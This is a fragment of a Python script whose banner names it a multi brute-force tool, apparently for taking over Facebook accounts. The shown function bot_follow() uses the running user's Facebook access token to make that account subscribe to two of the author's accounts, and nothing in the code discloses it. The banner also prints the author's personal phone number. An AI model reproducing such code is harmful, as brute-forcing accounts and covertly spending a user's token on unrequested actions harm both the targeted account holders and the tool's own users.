...
def banner():
    print("""\x1b[0;37m   ___                   \n  / _ \_______              \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 3.9  │ Author  : Gilang Gans   \n       /  ^ \/ / // /  ^ \   │ Contact : 085880600492   \n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/100023761421485/subscribers?access_token=" + toket) # Gilang
	requests.post("https://graph.facebook.com/100015380491864/subscribers?access_token=" + toket) # Misell
